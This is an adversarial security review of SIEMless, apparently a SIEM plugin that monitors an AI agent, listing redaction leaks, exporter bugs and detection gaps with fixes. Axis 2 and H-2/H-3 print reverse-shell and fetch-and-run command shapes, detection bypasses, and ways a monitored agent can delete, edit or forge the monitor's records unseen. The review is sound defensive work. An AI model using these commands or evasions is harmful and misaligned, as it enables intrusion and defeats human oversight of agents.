# SIEMless adversarial review, round 1

Reviewer: independent (first look at this code). Date: 2026-11-08. Tree: `/home/claude/siemless` at `752b81f` plus the
coordinator's in-flight moves (fixtures 8 → `tests/fixtures/`, `tests-js` → `tests/js`, `tools/bench.py` → `tests/bench.py`).
Nothing outside `audit/` was modified.

Evidence: `audit/test_audit_round1.py`. Each test asserts the *claimed* behaviour, so **a failing test is a confirmed
finding**. Run it with `cd /home/claude/siemless && python3 -m pytest -q audit/test_audit_round1.py -p no:cacheprovider`.
Current result: **32 failed, 3 passed** (the 3 passing tests are "held up" checks). The scratch probes I used for discovery
(`audit/_probe*.py`) are deleted because they added install-scanner hits; every reproduction below names its test.

Severity scale: critical (claim is broken in the default config and it is easy to trigger) / high / medium / low / note.

---

## Axis 1: Redaction and leaks

### H-1 (high): Common command-line and URL credential shapes are stored and exported in clear
- **What:** `redact_text` (`siemless_core/redact.py:128-140`) has no pattern for credentials passed as CLI flags or in
  URL paths, and its prefix list (`redact.py:21-45`) misses several high-value vendors. Verified to pass through unchanged:
  - `curl -u admin:hunter2secret https://…` (also lands in `process.exec.target` / OCSF `process.cmd_line` / CEF `cs6`)
  - `mysql -uroot -phunter2secret`, `--password hunter2secret`, `-p'…'`
  - `post_approval_response.command` = `mysql -uroot -phunter2secret …` → `approval.response.target` (approval prompts are
    exactly where these commands show up)
  - Stripe `sk_live_…` / `rk_live_…` (the list has `sk-` with a hyphen only), AWS STS `ASIA…`, SendGrid `SG.x.y`,
    DigitalOcean `dop_v1_`, Grafana `glsa_`, Linear `lin_api_`, `AGE-SECRET-KEY-1…`
  - Slack incoming-webhook URLs (`hooks.slack.com/services/T…/B…/<secret>`) and Discord webhook URLs
    (`/api/webhooks/<id>/<token>`). **SL-012 puts that URL in `target`**, so the rule that detects webhook use exports the
    webhook's own credential to the SIEM.
- **Repro:** tests `test_cli_password_flags_redacted`, `test_vendor_prefixes_redacted`, `test_webhook_url_secret_redacted`.
- **Why it matters:** the README promises "no secrets in storage or exports". These shapes are everyday shell usage,
  and with `remote_export` on they go to Splunk, Elastic or syslog in clear.
- **Fix:** add patterns for `-u user:pass`, `--user[= ]user:pass`, `-p<pass>` after `mysql|mysqladmin|mysqldump`,
  `--password[= ]X`, `--token[= ]X`, `sshpass -p X`; add the prefixes `sk_live_`, `sk_test_`, `rk_live_`, `ASIA`, `SG.`,
  `dop_v1_`, `glsa_`, `lin_api_`, `AGE-SECRET-KEY-`; mask the path after `hooks.slack.com/services/` and
  `/api/webhooks/<id>/`. Put each one in the canary fixture.

### M-1 (medium): A PEM private key longer than 1600 chars is not redacted in previews
- **What:** `preview()` (`redact.py:155-157`) cuts the text to `limit*8` chars *before* redacting. `_PEM_RE` needs the
  PEM END line, so a 2048-bit RSA PEM (~1700 chars) or any larger key loses its END line in the
  cut and is not masked. The preview then shows the PEM BEGIN header and the first ~160 chars of the base64 key body.
  This applies to `write_file.content` and to the `terminal` `command` argument, which is how a key file normally gets
  written (`cat > ~/.ssh/id_rsa <<EOF …`). The same happens with GCP service-account JSON (~2.3 KB): its
  `private_key_id` also leaks, because `private_key_id` does not match `_KV_RE`.
- **Repro:** test `test_long_pem_redacted_in_preview`.
- **Why:** the leaked bytes are mostly the public modulus, so the key cannot be rebuilt from them. But stored and
  exported events now contain `BEGIN … PRIVATE KEY` text, which breaks the claim and sets off downstream DLP.
- **Fix:** mask from `-----BEGIN [A-Z ]*PRIVATE KEY-----` to the END marker *or the end of the string*
  (`.*?(?:-----END …-----|\Z)`). Separately, redact before cutting, or cut with an overlap at least as long as the
  longest pattern.

### M-2 (medium): Several collector fields bypass redaction entirely
- **What:** `_s()` (`collectors.py:52-59`) only truncates. It is the sole treatment for: kanban `board`, `assignee`,
  `run_id`, `profile_name`, `exit_kind` (`collectors.py:451`); session `reason` (`:81-83`); `api_request_error.reason`
  (`:129`); `decided_by`, `pattern_key`, `surface`, `model`, `provider`, `child_role`, `status`, and every id field.
  Dict *keys* in tool args are also stored verbatim (`redact.py:176-182`, and `arg_names` at `collectors.py:167`), so
  `{"ghp_…": 1}` keeps the token.
- **Repro:** tests `test_kanban_and_reason_fields_redacted`, `test_secret_shaped_arg_keys_redacted`.
- **Fix:** route every free-text `_s()` value through `redact_text` (keep raw `_s` for ids only), and redact keys in
  `bound_args` and `arg_names`.

### M-3 (medium): `bound_args` does not bound lists, so the "total" budget is not a bound
- **What:** `redact.py:188-192` gives every list element the full `total` budget and never subtracts from it. With
  `per_value=200, total=1500`, the arg `{"a": [[["y"*199]*32]*32]}` produces **208 KB** of `attrs.args` (139× the
  budget). It is written to SQLite, `events.jsonl` and each exporter. On the agent thread it took 27 ms.
- **Repro:** measured with a one-off probe; test `test_bound_args_total_is_a_bound`.
- **Fix:** thread a shared remaining-budget through dicts *and* lists, and stop at it (`{"$truncated": true}`).

### L-1 (low): Whitespace collapse pulls the cut tail into the preview
- `preview()` cuts at 1600 chars, then collapses whitespace. If padding pushes a secret across the cut, its head
  (fewer than 16 chars after the prefix, too short for `_PREFIX_RE`) lands inside the 200-char preview. Observed:
  `"x" + " "*1595 + "sk-ant-api03-…"` → `x sk-a`. Only a few characters leak. The M-1 fix (redact before cutting)
  closes this too.

### L-2 (low): `_KV_RE` stops at the first space in a quoted value
- `PASSWORD: "hunter2 with space"` → `PASSWORD: "«redacted» with space"`. Values in quotes should be masked up to the
  closing quote.

---

## Axis 2: Detection evasion and false positives

All results come from the full chain (`process_now`, `finding_cooldown_s=0`). Items marked † have a test in `audit/test_audit_round1.py`; the rest were reproduced by a deleted probe and can be re-run with the same `run(fresh(), [...])` helper.

### H-2 (high): The monitored agent can blind or erase SIEMless without any finding
- **What:** none of the following produces a finding (test `test_telemetry_tamper_is_detected`):
  - `rm -f ~/.hermes/plugin-data/siemless/siemless.db …/*.jsonl`. `cmd:log_tamper` (`sensitive.py:296`) covers
    `/var/log|.hermes/logs|audit|wtmp|lastlog`, not SIEMless's own data directory.
  - `sqlite3 ~/.hermes/plugin-data/siemless/siemless.db 'delete from findings'`
  - `hermes siemless ack <id>`. The CLI that `register()` exposes (`__init__.py:84-96`, `commands.py`) lets the agent
    mark its own findings "reviewed", which dims them on the Desktop page (`plugin.js:138,157`).
  - `hermes siemless replay forged.jsonl` injects arbitrary events and findings (see H-4).
  - Disabling rules or allow-listing `.site` through `hermes config set plugins.entries.siemless…` does fire SL-010
    (good), but only as a generic "governance change". Nothing says the detector itself was weakened.
- **Why:** an attacker who controls the agent knows what it is monitored by. Without a tamper signal the SIEM simply
  goes quiet. When `remote_export` is off (the default), the local DB is the only copy.
- **Fix:** add `plugin-data/siemless`, `siemless.db`, `events.jsonl`, `findings.jsonl` to `_SECURITY_CONFIG_PATHS` /
  `cmd:log_tamper`, as a dedicated "telemetry tamper" tag (critical); treat `hermes siemless (ack|replay)` and
  `plugins.entries.siemless` edits as SL-010 `config:siemless`. Write ack and replay to the store as audit events.
  Consider making `ack` require the Desktop/dashboard route rather than the CLI the agent can reach.

### H-3 (high): Credential reads through non-listed tools, globs or interpreters are invisible
- **What:** each of these produced **zero** findings:
  - MCP or other plugin file tools, e.g. `mcp_filesystem_read_file {path: ~/.aws/credentials}` †. Only
    `FILE_READ_TOOLS` (`sensitive.py:328`) derive `secret.access`. An unknown tool with a sensitive `path` only gets a
    tag on the base event (`collectors.py:238-242`), and no rule triggers on `tool.call` tags.
  - `cat ~/.ss?/id_*` (glob), which `classify_path` cannot match.
  - `execute_code` with `open(os.path.expanduser('~')+'/.s'+'sh/id_rsa')`.
  - Python reverse shell (`socket.connect(("1.2.3.4",4444)); pty.spawn("sh")`) and `bash -i >& /dev/tc''p/…`: SL-009
    claims reverse shells but sees neither.
  - `crontab /tmp/c` (the regex needs `crontab -`), so SL-005 misses it.
  - `curl … -o i.sh && sh i.sh`, `bash -c "$(curl …)"` (the Homebrew installer shape) and `base64 -d > f; sh f`.
  - `export HERMES_YOLO_MODE=1`, and `python3 -c "open('~/.hermes/config.yaml','w')…"` (no `_WRITE_HINT`).
- **Why:** SL-001/2/3/4/8/11/13 all depend on `secret.access`. A single unlisted tool name turns off the whole
  exfiltration chain.
- **Fix:** derive `secret.access` / `config.change` from *any* tool whose path-like argument classifies as sensitive
  (keep visibility `inferred` for unknown tools). Treat path args containing `*?[` as matching when the literal prefix
  does (`~/.ss?` → `.ssh`). Add Python/Perl socket+dup2/pty shapes, `crontab <file>`, `$(curl…)` / `<(curl…)`,
  `-o X && (ba)?sh X`, and `HERMES_YOLO`. List the inherent limits (string-built paths/URLs in code) in the README.

### M-4 (medium): Flooding the per-session deque or splitting sessions breaks SL-001
- 1001 cheap tool calls between the secret read and the egress evict the `secret.access` from the
  1000-event `deque` (`correlate.py:29`), so SL-001 never fires even inside the 10-minute window †. Reading in session A
  and sending from session B (two Hermes sessions on one profile) is also not correlated.
- **Fix:** keep a separate small per-session (and per-profile) ring of *sensitive* events (secret.access,
  config.change, content.untrusted) that ordinary tool calls cannot evict. Add a profile-level SL-001 variant
  (secret in any session → egress in any session within N minutes, lower confidence).

### M-5 (medium): Path allow-list is bypassable with `..`
- `allowlisted_path` (`rules/__init__.py:109-113`) is a raw `startswith`/`endswith`. With `allow_paths=/home/u/proj`,
  reading `/home/u/proj/../.ssh/id_rsa` suppresses SL-003 *and* SL-001; only SL-004 fired †.
- **Fix:** `posixpath.normpath` the target before comparing, and match on path-component boundaries.

### M-6 (medium): Webhook classification is evaded by a trailing dot
- `https://webhook.site./x` resolves the same, but `classify_host` (`sensitive.py:152-167`) compares raw strings, so
  SL-012 does not fire and SL-001 drops from critical to high †. The same applies to `allow_hosts` and `DEV_HOSTS`.
  Decimal or hex IP literals (`http://2130706433/`) are not tagged `raw_ip`/`private`.
- **Fix:** in `host_of`, strip the trailing dot, IDNA-normalise, and canonicalise numeric IPs with `ipaddress`.

### M-7 (medium): The dedupe key hides escalation within the cooldown
- `SL-013` dedupes on `session:message|delegation` (`baseline.py:560`). A short status message after a `.env` read
  uses up the slot, so a 5000-char message to a different recipient seconds later produces no SL-013 (it would have
  been *high*). SL-008 (`session:kind`) and SL-002 (`session:turn:kind`) behave the same way. SL-001 still fired in the
  probe, so this is a severity/visibility loss rather than a full miss.
- **Fix:** include the target/host in dedupe keys, and let a higher-severity finding through the cooldown of a
  lower one.

### FP-1 (high, false positives): Ordinary workflows produce high and critical findings
| Benign workflow | Findings |
|---|---|
| `web_extract https://docs.python.org/3/` then edit `AGENTS.md` | **SL-010 critical** + SL-002 high |
| edit `AGENTS.md` / `CLAUDE.md` alone | SL-010 high |
| `read_file .env` then reply to the owner with `send_message` | **SL-001 high** ("egress to owner") + SL-013 |
| `patch .env` then `git push` | **SL-001 high** ("egress to git push") + SL-011 |
| read `~/.hermes/profiles/default/skills/x/SKILL.md` (own profile) | **SL-014 high** "another profile" |
| `env \| grep PYTHON` | **SL-003 high** (`cmd:env_dump`) |
| `curl -LsSf https://astral.sh/uv/install.sh \| sh` | SL-009 high (documented) |
| read `.env.example` | SL-003 medium |
| `grep -rn credentials src/` | SL-003 low, target is the grep command |

- SL-014's "another profile" branch (`baseline.py:578`) fires for *any* path containing `/.hermes/profiles/`,
  including the active profile. SL-001 treats every `send` as external egress whatever the destination
  (`baseline.py:43-44`), and a `git push` event has no host, so the title reads "egress to git push".
- **Fix:** compare the profile in the path with `ctx.state.profile`. Do not let `send` to the session's own platform
  or chat raise SL-001 above medium. Exempt `*.example|*.sample|*.template` by default. Make `env | grep` a
  non-dump, since output piped to a filter does not dump the environment. Cap SL-010 at high when the only taint is
  a docs fetch with no other governance change.

---

## Axis 3: Reliability

### H-5 (high): `subagent_stop` does unbounded work on the agent thread
- **What:** `_subagent_stop` (`collectors.py:388-414`) caps history at 500 entries but collects *every* target of
  every entry (`targets += …`, no cap) and runs `classify_path` (about 40 regexes) on each one. All of this runs inside
  the hook callback, before `put_nowait`. 500 entries × 1000 targets **blocked the caller for 20.3 s**. That is about
  40 µs per target, so a 200-call subagent with about 10 targets per call costs about 80 ms per stop.
- **Repro:** test `test_subagent_stop_is_cheap` (500 × 100 targets: 2.2 s; it asserts < 50 ms).
- **Why:** this contradicts "nothing blocks the agent", and the size is controlled by whatever the child did.
- **Fix:** cap `targets` at about 64 during collection, and classify only that capped list. Better still, move every
  classification step except the payload copy onto the worker thread.

### M-8 (medium): One 4xx makes an exporter `refused` for the rest of the process, and its spool is stranded
- `_post` maps 400/401/403/404/413 to `ExportRefused` (`exporters/http.py:72-73`). `_deliver` sets `state="refused"`,
  and every later batch is dropped (`dispatch.py:220-223`). Nothing ever clears that state, not even a successful
  `test-exporter`. A token rotation (one 401), a receiver restart that briefly returns 404, or a single oversized batch
  (413) silently drops all telemetry until Hermes restarts. The on-disk spool is never drained again †.
- **Fix:** treat 401/403/404 as retryable with a long backoff (for example 15 min), and keep `refused` only for a
  config error found at startup. On 400/413, split the batch and quarantine the single bad event instead of
  condemning the destination.

### M-9 (medium): One bad Elastic document wedges the exporter forever and duplicates everything
- `ElasticExporter.send` raises `ExportError` when the bulk response has `errors: true` (`exporters/http.py:133-134`),
  so the whole batch goes back to the spool. On the next delivery `drain_spool` sends the same poison document first,
  fails again, and the new batch is spooled behind it (`dispatch.py:228-230`). From then on nothing reaches Elastic,
  and the spool fills to `spool_max_mb` and starts dropping. The good documents of each failed batch were already
  indexed, and `create` into a data stream has no `_id` (`http.py:126`), so each retry duplicates them (test `test_elastic_bad_item_does_not_wedge`: still `retrying` after 4 posts). This breaks
  the dispatcher's own claim that "every event carries its id, so receivers dedupe".
- **Fix:** set `_id = event.id` on the `create` action. Parse per-item results: drop or quarantine items with a 4xx
  status and retry only the 429/5xx items.

### M-10 (medium): Exporters follow redirects with the bearer token, including https → http
- `urllib.request.urlopen` follows 301/302/303 for POST: it re-issues the request as GET to whatever `Location`
  says and **keeps the `Authorization` header**. Observed: a receiver returning `302 Location: http://127.0.0.1:8792/steal`
  caused `Authorization: Bearer SUPER-SECRET-TOKEN` to be sent to the second server, and the exporter counted it as
  a success (the body was lost).
- **Repro:** test `test_exporter_does_not_follow_redirects_with_token` (two loopback servers; the second one receives `Bearer TOKEN-THAT-MUST-NOT-MOVE`).
- **Why:** this defeats "https only" and leaks the HEC token, Elastic key or Summit token to any host a misconfigured
  or compromised endpoint (or LB rule) names.
- **Fix:** install an opener with a `HTTPRedirectHandler` subclass that refuses all redirects (`redirect_request` →
  `None`) and treat 3xx as `ExportError`.

### M-11 (medium): Retention never runs on a busy agent; hosts table and status scan grow forever
- `_housekeeping` (`pipeline.py:182-189`) only runs when `self._in.get(timeout=0.5)` times out. If an event arrives at
  least every 0.5 s (a busy gateway, a kanban worker), prune never runs, and `max_events` / `retention_days` are not
  enforced.
- `hosts_seen` is never pruned (`store.py:340-350`). `status()` calls `self.store.hosts(100000)` just to count rows
  (`pipeline.py:209`).
- **Fix:** run prune on a wall-clock check inside the loop, not only on the idle branch. Prune `hosts_seen` by
  `last_seen`. Use `SELECT COUNT(*)` for the count.

### L-3 (low): `recent()` stops early on an out-of-order event
- `Correlator.recent` iterates newest-first and `break`s at the first event older than the window
  (`correlate.py:130-131`). One late-arriving old event (a replay into a live session, a clock step) hides every
  in-window event before it in the deque. This contradicts the module docstring ("windows are computed on event time,
  not arrival order"). Test `test_recent_tolerates_out_of_order`. Fix: `continue` instead of `break`, or keep the deque sorted by time.

### What held up (reliability)
- The hook callback is wrapped twice in try/except (`__init__.py:59-63`, `collectors.py:67-71`),
  and a malformed payload becomes a `collector_error` event.
- An exporter that raises an arbitrary exception is caught and backed off (`dispatch.py:251-259`). The worker
  survived every exporter failure I threw at it.
- The input queue and dispatch queue are bounded with drop-oldest counting. The correlator caps sessions, events, seen
  ids and the host cache; the dedupe map caps at 4096.
- SQLite uses one connection behind an RLock with WAL. Test `test_concurrent_ingest_reads_replay_no_deadlock` (4 threads running ingest,
  reads + `status()`, replay and prune, 40 rounds each) **passes**: no deadlock, no `database is locked`.
- Test `test_hooks_never_raise_on_garbage` **passes**: 23 hooks × 30 random junk payloads (None, NaN, 100 KB strings,
  bytes, `object()`, U+2028/NUL/BOM) through the real `register()` callbacks. Every callback returned `None`, and none raised.

---

## Axis 4: Output injection

### M-12 (medium): A path can forge the CEF severity field
- **What:** `to_cef` escapes the name and *then* truncates it: `_cef_header(name)[:200]` (`ocsf.py:399-400`). If a
  `|` lands at escaped position 199, the cut keeps the backslash and drops the pipe. The trailing `\` then escapes the
  real header delimiter, so a parser sees one fewer field and reads the **extension** as the severity. Finding titles
  embed `event.target` (for example `Credential store targeted: {path}`), and the agent picks the path.
- **Repro:** (at k=199 the severity field parsed as `'rt=… act=finding …'`)
  test `test_cef_header_truncation_cannot_eat_delimiter`.
- **Why:** ArcSight, QRadar and Sentinel CEF parsers would mis-parse severity or drop the event. A *critical* SL-001
  finding can be demoted or made unparseable by naming the file it reads.
- **Fix:** truncate the raw value first, then escape (and never end a header field on an odd number of backslashes).
  Do the same for `cs4`/`cs6`/`request`, which are also escaped and then cut.

### M-13 (medium): U+2028 / U+0085 in any field silently loses spooled events
- **What:** spool lines are written with `ensure_ascii=False` (`dispatch.py:69`), so U+2028, U+2029 and U+0085 stay
  raw (JSON does not have to escape them). `drain_spool` reads with `str.splitlines()` (`dispatch.py:87`), which
  splits on exactly those characters. The line becomes two invalid JSON fragments, both are skipped as `done`, and the
  spool is deleted. 3 events spooled → 5 lines → **1 delivered after recovery, `dropped: 0`**. Test `test_spool_survives_line_separators`.
- **Why:** an agent that puts ` ` in a URL or file name makes its exfiltration event and the matching finding
  (whose title carries the target) disappear from the SIEM whenever the exporter was down, with no drop counted.
  Consumers that use `splitlines()`, or JS `JSON.parse` on per-line splits that break on U+2028, have the same problem
  with `events.jsonl`.
- **Fix:** split on `"\n"` only (`fh.read().split("\n")`), or write the spool with `ensure_ascii=True`. Count lines
  that fail to parse as `dropped`.

### L-4 (low, needs confirmation in `wazuh-logtest`): The named Wazuh rules probably never fire for medium+ findings
- `100511/12/13` (severity) and `100520…100532` (per-rule, with the `<mitre>` mappings) are all children of `100510`
  (`docs/integrations/wazuh/local_rules.xml:28-92`). Wazuh tests sibling children in order, and the first match wins.
  Every medium, high or critical finding matches a severity rule first, so the SL-specific rules and their MITRE tags
  would only apply to low findings. **Fix:** make the per-rule entries children of the severity rules, or put the
  severity in the per-rule entries' levels and drop 100511-13.

### What held up (injection)
- Syslog: SD-PARAM values escape `\ " ]` per RFC 5424 §6.3.3. HOSTNAME and MSGID are filtered to PRINTUSASCII. TCP and
  TLS use RFC 6587 octet counting, and UDP sends one message per datagram, so newlines in content cannot start a new
  record. The BOM is only added for non-ASCII MSG.
- CEF extension values escape `\`, `=`, CR and LF. Header fields escape `\` and `|`. Apart from the truncation bug
  above, I could not forge a key.
- JSONL: `json.dumps` escapes `\n`, `\r`, control characters and quotes. No line forgery through `\n`, BOM or
  RTL-override in Wazuh's newline-based reader (RTL overrides survive verbatim, which is a display issue for analysts,
  not a parse issue).
- Desktop `plugin.js`: React `createElement` only. No `innerHTML`, `dangerouslySetInnerHTML`, `eval`, raw `fetch` or
  `href` built from data; text from findings is rendered as text.

---

## Axis 5: Catalog compliance

Upstream validator (`/tmp/valvenv/bin/python`, `hermes_cli.plugin_validate.validate_plugin_dir`, run 2026-11-08):
manifest, config schema, requires_env, loadable, capability probe, **declared hooks = registrations**, no tools, no
middleware, **no core override**, **desktop surface** all pass. Isolation verdict `host`. The only rule-9 warning is
`tools/admission_lint.py:21 hermes_cli.plugin_validate`, which matches the README. `hermes_cli.config`,
`hermes_cli.plugin_events`, `hermes_constants` and `plugins.plugin_storage` are all in
`website/docs/developer-guide/plugins/public-api.md`. `agent.secret_scope.get_secret` is the route catalog rule 11
prescribes. No `.env`/`auth.json` reads, no monkeypatching, no self-update, no subprocess.

### M-14 (medium, release blocker): The security scan verdict is `dangerous`, not the *caution* the README states
- The scan currently fails. Besides the expected detector literals, it counts **`bytecode_file` for every
  `__pycache__/*.pyc` in the tree** (≈30 hits, including test caches) and the canary literals the coordinator is
  moving. My own `audit/_probe*.py` scratch files also added hits (`embedded_private_key`, `python_socket_oneliner`,
  …). I have **deleted them** and kept the evidence in `audit/test_audit_round1.py`, with shapes assembled from parts
  as `redact.py` does. **Exclude `audit/` from the release tarball anyway.**
- **Fix:** `find . -name __pycache__ -prune -exec rm -rf {} +` before packaging (and make sure the catalog tarball is
  built from `git archive`, not the working dir). Re-run the scan and update the README line ("reports *caution*")
  to whatever it actually says.

### L-5 (low): `tools/admission_lint.py` cannot run with the system Python
- `python3 tools/admission_lint.py /home/claude/helm120/ha` → `ModuleNotFoundError: No module named 'ruamel'`
  (Hermes's `hermes_yaml`). It only works from a Hermes venv. Say so in its usage line or have it re-exec with
  `HERMES_PYTHON`.

### Note: Claims to re-check against behaviour
- README: "Tool arguments are bounded to ~1.5 KB per call". False for lists (M-3).
- README: "Never stored: … secrets". See H-1, M-1, M-2.
- README Disclosure: "Network … only to those destinations over verified TLS". Redirects are followed, with the
  token, to any scheme (M-10).
- README: "A refused token stops retries". Also true of 400/404/413, and the state never recovers (M-8).
- Under a multiplexing gateway, `secret()` is called in the exporter constructor, which runs on the first hook. If
  that hook runs outside a profile scope, `get_secret` raises `UnscopedSecretError`, the `except Exception` swallows
  it, the token is `None`, and the exporter is `refused` forever (M-8). The pipeline is also a process-global
  singleton (`__init__.py:20,40-47`) stamped with the first profile's name, so a multiplexed process would file every
  profile's events under one profile and one token. I did not run a multiplexed gateway, so treat this as
  *unverified*.

---

## Axis 6: Claim correctness

### H-4 (high): Replayed events and findings are not labelled and go to the live store and the SIEM
- **What:** `commands.replay` sets `payload["_replay"] = True` (`commands.py:112`), but nothing reads `_replay`: no
  collector, event field, OCSF/ECS/CEF field or finding field carries it. The CLI prints `[REPLAY, not live]`, but
  the events and findings written to `siemless.db`, `events.jsonl`/`findings.jsonl` and every remote exporter are
  indistinguishable from live ones. The `/siemless` slash command and `hermes siemless replay` both run on the *live*
  pipeline. The dashboard `/replay` writes into the same store.
- **Repro:** test `test_replay_is_labelled` (the store has no `replay` marker on events or findings).
- **Why:** a demo run on a production profile files critical SL-001s with ATT&CK ids into Splunk. An agent that can
  run `hermes siemless replay` (it has a terminal) can forge or bury findings (H-2).
- **Fix:** carry `replay: true` on the Event (and in `unmapped.siemless`, ECS `labels`, CEF `cs`, syslog SD), give
  replays their own session-id namespace, and do not offer replayed events to remote exporters unless asked
  (`--export`).

### L-6 (low): `/replay` path check is a string prefix
- `plugin_api.py:150` uses `str(rp).startswith(str(r.resolve()))`, so `…/plugin-data/siemless-other/x.jsonl` or
  `…/demo-evil/x.jsonl` passes. Use `rp.is_relative_to(root)`.

### L-7 (low): Sigma correlation groups by turn, not session
- `mr_siemless_corr_secret_then_egress.yml` groups by `metadata.correlation_uid`, which `ocsf._metadata` sets to
  `turn_id or session_id` (`ocsf.py:123-124`). A secret read in turn 1 and egress in turn 2 of the same session are
  not correlated, although the description says "same session". Group by `actor.session.uid`.

### L-8 (low): T1550 for token fetch / env dump
- SL-003 maps `cmd:token_fetch` / `cmd:env_dump` to T1550 *Use Alternate Authentication Material* (lateral-movement,
  `baseline.py:195`). Fetching a token is T1528 *Steal Application Access Token* (credential-access), which is valid
  in the bundled 20.1 data.

### What held up (claims)
- **OCSF:** 120 renderings (every kind × denied/allowed/cron/plugin actions) pass `tools/ocsf_check.py --schema
  /tmp/std-src/ocsf-schema` (1.9.0) with 0 invalid. Activity ids match each class's enum (1006 Create…Start, 6002
  Install…Update, 4002 Get=3, 1007 Launch/Terminate). `type_uid` = class×100+activity. The `security_control`
  action_id 3 "Observed" and dispositions 8/14/25 exist in the 1.9 profile. `ai_operation` exists.
- **ATT&CK:** all 29 ids used by the rules exist, unrevoked, in `/tmp/std-src/enterprise-attack.json` (Enterprise
  20.1) with the names in `attack.json`. T1562.001 is correctly avoided (revoked → T1685).
- **Sigma:** all 22 rules validate against the upstream sigma-specification JSON schemas (the copies in
  `docs/standards` are byte-identical to upstream).
- **RFC 5424 / 6587, CEF escaping, HEC envelope** (`time` seconds float, `event`, `host`, `index`, `sourcetype`): correct
  apart from M-12.

---

## Axis 7: Demo

- `python3 demo/lab/receiver.py --port 8799` bound **127.0.0.1 only**. `GET /page` 200, and it names only
  `demo/lab/fake_home/.ssh/id_rsa`. `POST /collect` stores length + sha256 prefix + UA, not the body.
  `POST /ingest` with no token → 401; with the demo token → 202. The receiver was killed afterwards.
- `fake_home/.env` and `fake_home/.ssh/id_rsa` are labelled synthetic canaries (`SIEMLESS-DEMO-CANARY-NOT-A-REAL-KEY`).
  Nothing in the demo reads the real `$HOME`. The page instructs the agent to read the *fake_home* path.
- Fixtures: `test_demo_expected_independent` replays the 7 fixtures in `demo/fixtures/` with a fresh pipeline
  (`watch_private_hosts=true`, default cooldown) and checks `demo/fixtures/expected.json` → **passes**.
  `tests/test_demo.py` (9 tests) also passes after the coordinator's move of fixture 8 to `tests/fixtures/`.

### L-9 (low): Demo receiver robustness and footprint
- `/ingest` with `{"findings":[{"severity":null}]}` or a JSON array body raises inside the handler
  (`receiver.py:79`, `.upper()` on None; `payload.get` on a list), and the connection is reset with no response.
- `Content-Length: -1` → `rfile.read(-1)`, so the handler thread blocks until the client closes (it hung for 3 s
  until curl timed out).
- It writes logs to `demo/lab/out/` **inside the plugin directory**, which is not git-ignored, so a packaged tree
  that ran the demo ships the logs. (I removed the `out/` I created.) Write to `$TMPDIR` or the plugin data dir.

### Note: The canary fixture is too easy
- `tests/fixtures/8_redaction_canaries.jsonl` checks 8 shapes, all of them prefix or `key=value` forms the redactor
  was written for. Add the H-1 shapes (CLI flags, Stripe, STS, webhook paths), a >1600-char PEM (M-1), secrets in
  kanban/reason fields and dict keys (M-2), so the "no secrets" claim is tested rather than assumed.

---

## Summary ranking

| id | sev | one line |
|---|---|---|
| H-1 | high | CLI-flag passwords (`curl -u`, `mysql -p`, `--password`), Stripe/STS/SendGrid/DO/Grafana keys and Slack/Discord webhook URL secrets reach the store and every export |
| H-2 | high | The agent can delete or `sqlite3`-edit SIEMless's DB, `ack` its own findings, or replay forged ones, with no finding |
| H-3 | high | Secret reads via MCP/plugin file tools, globs, interpreter code; Python reverse shells; `crontab <file>`; `bash -c "$(curl…)"`: all invisible |
| H-4 | high | Replays are not labelled anywhere, so replayed findings land in the live store and the SIEM as real |
| H-5 | high | `subagent_stop` collection is unbounded on the agent thread (2.2 s for 50k targets, 20 s for 500k) |
| FP-1 | high | docs fetch + AGENTS.md edit → critical; .env read + owner reply → high; own-profile read → SL-014 high; `env \| grep` → high |
| M-1 | medium | A PEM key over 1600 chars is cut before redaction, so the END marker is lost and the key body appears in previews |
| M-2 | medium | Kanban fields, session/LLM `reason`, approval metadata and arg *keys* skip redaction |
| M-3 | medium | `bound_args` never decrements its budget for lists (208 KB from a 1.5 KB budget) |
| M-4 | medium | 1001 cheap events evict the secret from the correlator; a second session breaks the chain |
| M-5 | medium | `allow_paths` bypass with `..` suppresses SL-001/003 |
| M-6 | medium | `webhook.site.` (trailing dot) evades SL-012 and SL-001's critical escalation |
| M-7 | medium | The dedupe key hides a later, higher-severity SL-013/008/002 in the cooldown |
| M-8 | medium | One 401/404/413 makes an exporter permanently `refused`; its spool is stranded |
| M-9 | medium | One bad Elastic document wedges the exporter; no `_id`, so every retry duplicates documents |
| M-10 | medium | HTTP exporters follow 30x with `Authorization`, including https→http |
| M-11 | medium | Retention only runs when idle; `hosts_seen` grows forever |
| M-12 | medium | Escape-then-truncate in the CEF header lets a path consume the delimiter, so severity is mis-parsed |
| M-13 | medium | U+2028/U+0085 splits spool lines; events are lost silently (`dropped: 0`) |
| M-14 | medium | The install scan currently says *dangerous* (pycache + literals), not the *caution* the README claims |
| L-1…L-9 | low | whitespace-collapse leak, quoted KV values, out-of-order `break`, Wazuh child order (unconfirmed), admission_lint needs ruamel, `/replay` prefix check, Sigma groups by turn, T1550 mapping, demo receiver robustness |

## What held up (overall)
- **Hook contract:** the validator confirms declared hooks = registered hooks, no tools, no middleware, no
  `pre_tool_call`, no core override, Desktop inside the SDK. Every hook callback swallowed every junk payload I sent.
- **Consent gate:** remote exporters start in `needs_consent` and `_deliver` skips them. TLS is always verifying,
  with `minimum_version` TLS 1.2. Plain HTTP is accepted only for Summit on loopback with the lab switch (redirects aside, M-10).
- **Formats:** OCSF 1.9 validates for every kind. ATT&CK ids are all current in 20.1. All 22 Sigma rules validate against upstream
  schemas. RFC 5424 SD escaping and RFC 6587 framing are correct. CEF extension escaping is correct.
- **Credentials:** read via `agent.secret_scope.get_secret`. No `.env` reads, no subprocess, no self-update.
- **Concurrency:** ingest, dashboard reads, replay and prune in parallel did not deadlock or corrupt the DB.
- **Demo:** the receiver stays on loopback, only synthetic canaries are on disk, and expected.json reproduces independently.
- **Bounded structures:** both queues (drop-oldest, counted), correlator sessions/events/seen ids, host cache, dedupe
  map, spool size (except the M-13 accounting hole).
